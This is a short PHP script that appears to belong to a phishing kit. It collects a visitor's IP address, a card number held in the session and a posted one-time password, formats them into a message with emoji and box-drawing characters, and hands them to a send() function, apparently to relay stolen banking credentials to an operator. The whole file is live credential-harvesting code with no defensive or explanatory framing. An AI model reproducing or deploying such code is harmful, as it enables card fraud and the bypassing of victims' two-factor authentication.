<?php
ini_set('display_errors', 1); 
error_reporting(E_ALL);
require_once('../function.php');
if(isset($_POST)){
	$ip = $_SERVER['REMOTE_ADDR'];
	$msg="🔥ᴄᴏᴅ ".$ip."\n";
	$msg.='┌── '. $_SESSION['card'] ."\n";
	$msg.='└─╼╼ '. $_POST['otp'] ."\n";
    send($msg);
}
?>